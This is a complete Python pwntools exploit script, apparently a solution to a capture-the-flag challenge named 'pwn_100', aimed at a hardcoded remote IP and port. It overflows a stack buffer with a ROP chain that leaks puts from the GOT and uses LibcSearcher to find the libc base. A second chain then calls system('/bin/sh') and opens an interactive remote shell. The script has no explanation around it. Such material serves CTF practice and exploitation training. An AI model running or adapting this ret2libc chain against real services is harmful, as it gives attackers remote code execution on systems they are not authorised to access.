from pwn import *
from LibcSearcher import * #database from libc.rip #ao ma canada vl :((((
elf = ELF("pwn_100")
h,p = '111.200.241.244',54382
p = remote(h,p)
#p = process("./pwn_100")
#gdb.attach("pwn_100","b *0x0000000004006B8")
#context.log_level='debug'
puts_got = 0x000000000601018
puts_plt = 0x000000000400500
pop_rdi_ret = 0x000000000400763
main = 0x00000000004006B8
exp = "A"*0x40+p64(1)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)+"B"*(200-0x40-8-8-8-8-8)
p.send(exp)
p.recvuntil("bye~\n")
puts_addr = u64(p.recv(6)+"\x00\x00")
libc = LibcSearcher('puts',puts_addr)
base = puts_addr - libc.dump('puts')
print hex(base)
system = libc.dump('system')
str_bin_sh = libc.dump('str_bin_sh')
print hex(system), hex(str_bin_sh)
aaa = "A"*0x40+p64(1)+p64(pop_rdi_ret)+p64(base+str_bin_sh)+p64(base+system)+p64(main)+"B"*(200-0x40-8-8-8-8-8)
p.send(aaa)
p.interactive()
